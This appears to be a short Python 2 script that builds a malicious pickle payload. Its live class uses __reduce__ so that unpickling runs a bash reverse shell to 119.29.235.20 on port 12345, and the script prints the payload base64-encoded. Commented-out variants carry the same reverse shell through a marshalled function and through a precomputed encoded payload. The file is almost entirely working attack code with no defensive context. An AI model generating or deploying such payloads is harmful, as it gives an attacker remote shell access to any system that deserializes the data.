# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import marshal
import base64


# def foo():
#     def fib(n):
#         import os
#
#         os.popen("/bin/bash -i >& /dev/tcp/119.29.235.20/12345 0>&1")
#         if n <= 1:
#             return n
#         return fib(n - 1) + fib(n - 2)
#
#     print 'fib(10) =', fib(10)
#
#
# str = """ctypes
# FunctionType
# (cmarshal
# loads
# (cbase64
# b64decode
# (S'%s'tRtRc__builtin__
# globals
# (tRS''tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
#
# import cPickle
#
# cPickle.loads(str)

import cPickle
import base64


class MMM(object):
    def __reduce__(self):
        import os
        s = "/bin/bash -i >& /dev/tcp/119.29.235.20/12345 0>&1"
        return (os.popen, (s,))


print base64.b64encode(cPickle.dumps(MMM()))


# import cPickle
# s = 'Y3Bvc2l4CnBvcGVuCnAxCihTJy9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTkuMjkuMjM1LjIwLzEyMzQ1IDA+JjEnCnAyCnRScDMKLg=='
# cPickle.loads(base64.b64decode(s))
